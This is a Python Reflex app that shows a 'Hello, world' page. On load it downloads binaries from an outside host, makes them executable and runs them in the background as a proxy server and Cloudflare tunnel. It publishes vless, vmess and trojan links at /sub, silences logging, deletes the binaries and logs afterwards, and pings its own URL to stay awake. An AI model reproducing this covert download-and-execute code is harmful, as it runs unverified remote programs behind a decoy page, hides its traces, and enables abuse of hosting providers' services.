# hello/hello.py
import reflex as rx
import os
import re
import shutil
import subprocess
import threading
import requests
import json
import time
import base64
from typing import List, Dict
import asyncio

#
class State(rx.State):
    file_path: str = os.environ.get('FILE_PATH', './tmp')
    project_url: str = os.environ.get('URL', '')
    interval_seconds: int = int(os.environ.get("TIME", 120))
    uuid: str = os.environ.get('UUID', 'ecff81ae-5f8f-40a8-8ccd-3ca2bbddd241')
    argo_domain: str = os.environ.get('ARGO_DOMAIN', '')
    argo_auth: str = os.environ.get('ARGO_AUTH', '')
    argo_port: int = int(os.environ.get('ARGO_PORT', 8001))
    cfip: str = os.environ.get('CFIP', 'www.visa.com.tw')
    cfport: int = int(os.environ.get('CFPORT', 443))
    name: str = os.environ.get('NAME', 'reflex')
    port: int = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 3000)
    status_message: str = ""
    sub_content: str = ""

# 
def setup_environment():
    if not os.path.exists(State.file_path):
        os.makedirs(State.file_path)
        print(f"{State.file_path} has been created")
    else:
        print(f"{State.file_path} already exists")

    paths_to_delete = ['boot.log', 'list.txt', 'sub.txt', 'npm', 'web', 'bot', 'tunnel.yml', 'tunnel.json']
    for file in paths_to_delete:
        file_path = os.path.join(State.file_path, file)
        try:
            os.unlink(file_path)
            print(f"{file_path} has been deleted")
        except Exception as e:
            print(f"Skip Delete {file_path}")

# 
def generate_config():
    config = {
        "log": {"access": "/dev/null", "error": "/dev/null", "loglevel": "none"},
        "inbounds": [
            {
                "port": State.argo_port,
                "protocol": "vless",
                "settings": {
                    "clients": [{"id": State.uuid, "flow": "xtls-rprx-vision"}],
                    "decryption": "none",
                    "fallbacks": [
                        {"dest": 3001},
                        {"path": "/vless-argo", "dest": 3002},
                        {"path": "/vmess-argo", "dest": 3003},
                        {"path": "/trojan-argo", "dest": 3004},
                    ],
                },
                "streamSettings": {"network": "tcp"},
            },
            {
                "port": 3001,
                "listen": "127.0.0.1",
                "protocol": "vless",
                "settings": {"clients": [{"id": State.uuid}], "decryption": "none"},
                "streamSettings": {"network": "ws", "security": "none"}
            },
            {
                "port": 3002,
                "listen": "127.0.0.1",
                "protocol": "vless",
                "settings": {"clients": [{"id": State.uuid, "level": 0}], "decryption": "none"},
                "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/vless-argo"}},
                "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
            },
            {
                "port": 3003,
                "listen": "127.0.0.1",
                "protocol": "vmess",
                "settings": {"clients": [{"id": State.uuid, "alterId": 0}]},
                "streamSettings": {"network": "ws", "wsSettings": {"path": "/vmess-argo"}},
                "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
            },
            {
                "port": 3004,
                "listen": "127.0.0.1",
                "protocol": "trojan",
                "settings": {"clients": [{"password": State.uuid}]},
                "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/trojan-argo"}},
                "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
            },
        ],
        "dns": {"servers": ["https+local://8.8.8.8/dns-query"]},
        "outbounds": [
            {"protocol": "freedom", "tag": "direct"},
            {"protocol": "blackhole", "tag": "block"}
        ]
    }
    with open(os.path.join(State.file_path, 'config.json'), 'w', encoding='utf-8') as config_file:
        json.dump(config, config_file, ensure_ascii=False, indent=2)

# 
def get_system_architecture() -> str:
    arch = os.uname().machine
    if 'arm' in arch or 'aarch64' in arch or 'arm64' in arch:
        return 'arm'
    return 'amd'

# 
def download_file(file_name: str, file_url: str):
    file_path = os.path.join(State.file_path, file_name)
    with requests.get(file_url, stream=True) as response, open(file_path, 'wb') as file:
        shutil.copyfileobj(response.raw, file)

# 
def get_files_for_architecture(architecture: str) -> List[Dict[str, str]]:
    if architecture == 'arm':
        return [
            {'file_name': 'npm', 'file_url': 'https://arm64.2go.us.kg/agent'},
            {'file_name': 'web', 'file_url': 'https://arm64.2go.us.kg/web'},
            {'file_name': 'bot', 'file_url': 'https://arm64.2go.us.kg/bot'},
        ]
    elif architecture == 'amd':
        return [
            {'file_name': 'npm', 'file_url': 'https://amd64.2go.us.kg/agent'},
            {'file_name': 'web', 'file_url': 'https://amd64.2go.us.kg/web'},
            {'file_name': 'bot', 'file_url': 'https://amd64.2go.us.kg/2go'},
        ]
    return []

# 
def authorize_files(file_paths: List[str]):
    new_permissions = 0o775
    for relative_file_path in file_paths:
        absolute_file_path = os.path.join(State.file_path, relative_file_path)
        try:
            os.chmod(absolute_file_path, new_permissions)
            print(f"Empowerment success for {absolute_file_path}: {oct(new_permissions)}")
        except Exception as e:
            print(f"Empowerment failed for {absolute_file_path}: {e}")

# 
def get_cloud_flare_args() -> str:
    processed_auth = State.argo_auth
    try:
        auth_data = json.loads(State.argo_auth)
        if all(k in auth_data for k in ['TunnelSecret', 'AccountTag', 'TunnelID']):
            processed_auth = 'TunnelSecret'
    except json.JSONDecodeError:
        pass

    if not processed_auth and not State.argo_domain:
        return f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {State.file_path}/boot.log --loglevel info --url http://localhost:{State.argo_port}'
    elif processed_auth == 'TunnelSecret':
        return f'tunnel --edge-ip-version auto --config {State.file_path}/tunnel.yml run'
    elif processed_auth and State.argo_domain and 120 <= len(processed_auth) <= 250:
        return f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {processed_auth}'
    return f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {State.file_path}/boot.log --loglevel info --url http://localhost:{State.argo_port}'

# 
def download_files_and_run():
    architecture = get_system_architecture()
    files_to_download = get_files_for_architecture(architecture)

    if not files_to_download:
        print("Can't find a file for the current architecture")
        return

    for file_info in files_to_download:
        try:
            download_file(file_info['file_name'], file_info['file_url'])
            print(f"Downloaded {file_info['file_name']} successfully")
        except Exception as e:
            print(f"Download {file_info['file_name']} failed: {e}")

    authorize_files(['npm', 'web', 'bot'])

    command1 = f"nohup {State.file_path}/web -c {State.file_path}/config.json >/dev/null 2>&1 &"
    try:
        subprocess.run(command1, shell=True, check=True)
        print('web is running')
        time.sleep(1)
    except subprocess.CalledProcessError as e:
        print(f'web running error: {e}')

    if os.path.exists(os.path.join(State.file_path, 'bot')):
        args = get_cloud_flare_args()
        try:
            subprocess.run(f"nohup {State.file_path}/bot {args} >/dev/null 2>&1 &", shell=True, check=True)
            print('bot is running')
            time.sleep(2)
        except subprocess.CalledProcessError as e:
            print(f'Error executing command: {e}')

    time.sleep(3)

#
def argo_config():
    if not State.argo_auth or not State.argo_domain:
        print("ARGO_DOMAIN or ARGO_AUTH is empty, use quick Tunnels")
        return

    if 'TunnelSecret' in State.argo_auth:
        with open(os.path.join(State.file_path, 'tunnel.json'), 'w') as file:
            file.write(State.argo_auth)
        tunnel_yaml = f"""
tunnel: {State.argo_auth.split('"')[11]}
credentials-file: {os.path.join(State.file_path, 'tunnel.json')}
protocol: http2

ingress:
  - hostname: {State.argo_domain}
    service: http://localhost:{State.argo_port}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
"""
        with open(os.path.join(State.file_path, 'tunnel.yml'), 'w') as file:
            file.write(tunnel_yaml)
    else:
        print("Use token connect to tunnel")

# 
def extract_domains():
    argo_domain = State.argo_domain if State.argo_auth and State.argo_domain else ''
    
    if argo_domain:
        print('ARGO_DOMAIN:', argo_domain)
        generate_links(argo_domain)
        return

    try:
        with open(os.path.join(State.file_path, 'boot.log'), 'r', encoding='utf-8') as file:
            content = file.read()
            match = re.search(r'https://([^ ]+\.trycloudflare\.com)', content)
            if match:
                argo_domain = match.group(1)
                print('ArgoDomain:', argo_domain)
                generate_links(argo_domain)
            else:
                print('ArgoDomain not found, re-running bot')
                subprocess.run("pkill -f 'bot tunnel'", shell=True)
                time.sleep(2)
                os.remove(os.path.join(State.file_path, 'boot.log'))
                
                for attempt in range(10):
                    print(f'Attempt {attempt + 1} of 10')
                    args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {State.file_path}/boot.log --loglevel info --url http://localhost:{State.argo_port}"
                    subprocess.run(f"nohup {State.file_path}/bot {args} >/dev/null 2>&1 &", shell=True)
                    time.sleep(3)
                    with open(os.path.join(State.file_path, 'boot.log'), 'r', encoding='utf-8') as file:
                        content = file.read()
                        match = re.search(r'https://([^ ]+\.trycloudflare\.com)', content)
                        if match:
                            argo_domain = match.group(1)
                            print('ArgoDomain:', argo_domain)
                            generate_links(argo_domain)
                            break
                    if attempt < 9:
                        subprocess.run("pkill -f 'bot tunnel'", shell=True)
                        time.sleep(2)
    except Exception as e:
        print(f"Error reading boot.log: {e}")

# 
def generate_links(argo_domain: str):
    meta_info = subprocess.run(['curl', '-s', 'https://speed.cloudflare.com/meta'], capture_output=True, text=True)
    meta_info = meta_info.stdout.split('"')
    ISP = f"{meta_info[25]}-{meta_info[17]}".replace(' ', '_').strip()

    time.sleep(2)
    VMESS = {
        "v": "2", "ps": f"{State.name}-{ISP}", "add": State.cfip, "port": State.cfport,
        "id": State.uuid, "aid": "0", "scy": "none", "net": "ws", "type": "none",
        "host": argo_domain, "path": "/vmess-argo?ed=2048", "tls": "tls",
        "sni": argo_domain, "alpn": ""
    }

    list_txt = f"""
vless://{State.uuid}@{State.cfip}:{State.cfport}?encryption=none&security=tls&sni={argo_domain}&type=ws&host={argo_domain}&path=%2Fvless-argo%3Fed%3D2048#{State.name}-{ISP}
vmess://{base64.b64encode(json.dumps(VMESS).encode('utf-8')).decode('utf-8')}
trojan://{State.uuid}@{State.cfip}:{State.cfport}?security=tls&sni={argo_domain}&type=ws&host={argo_domain}&path=%2Ftrojan-argo%3Fed%3D2048#{State.name}-{ISP}
"""
    
    with open(os.path.join(State.file_path, 'list.txt'), 'w', encoding='utf-8') as list_file:
        list_file.write(list_txt)

    sub_txt = base64.b64encode(list_txt.encode('utf-8')).decode('utf-8')
    with open(os.path.join(State.file_path, 'sub.txt'), 'w', encoding='utf-8') as sub_file:
        sub_file.write(sub_txt)

    try:
        with open(os.path.join(State.file_path, 'sub.txt'), 'rb') as file:
            State.sub_content = file.read().decode('utf-8')
        print(f"\n{State.sub_content}")
    except FileNotFoundError:
        print("sub.txt not found")

    print(f'\n{State.file_path}/sub.txt saved successfully')
    time.sleep(45)

    files_to_delete = ['npm', 'web', 'bot', 'boot.log', 'list.txt', 'config.json', 'tunnel.yml', 'tunnel.json']
    for file_to_delete in files_to_delete:
        file_path_to_delete = os.path.join(State.file_path, file_to_delete)
        if os.path.exists(file_path_to_delete):
            try:
                os.remove(file_path_to_delete)
            except Exception as e:
                print(f"Error deleting {file_path_to_delete}: {e}")

    print('App is running')
    print('Thank you for using this script, enjoy!')

# 
def start_server():
    setup_environment()
    generate_config()
    download_files_and_run()
    argo_config()
    extract_domains()

# 
async def visit_project_page():
    while True:
        try:
            if not State.project_url or not State.interval_seconds:
                print("URL or TIME variable is empty, Skipping visit web")
            else:
                response = requests.get(State.project_url)
                response.raise_for_status()
                print("Page visited successfully")
        except requests.exceptions.RequestException as error:
            print(f"Error visiting project page: {error}")
        await asyncio.sleep(State.interval_seconds)

# Reflex 路由和页面
@rx.route('/')
def index() -> rx.Component:
    return rx.vstack(
        rx.text("Hello, world", font_size="2em"),
        rx.text(State.status_message),
        rx.text(State.sub_content),
        align_items="center",
        spacing="4",
    )

@rx.route('/sub')
def sub() -> rx.Component:
    try:
        with open(os.path.join(State.file_path, 'sub.txt'), 'rb') as file:
            content = file.read()
        return rx.text(content.decode('utf-8'))
    except FileNotFoundError:
        return rx.text("Error reading file", status=500)

# 初始化应用
app = rx.App(state=State)

# 启动时运行服务
def on_load():
    threading.Thread(target=start_server, daemon=True).start()
    asyncio.create_task(visit_project_page())

app.add_page(index, on_load=on_load)
app.add_page(sub)

if __name__ == "__main__":
    app.run()
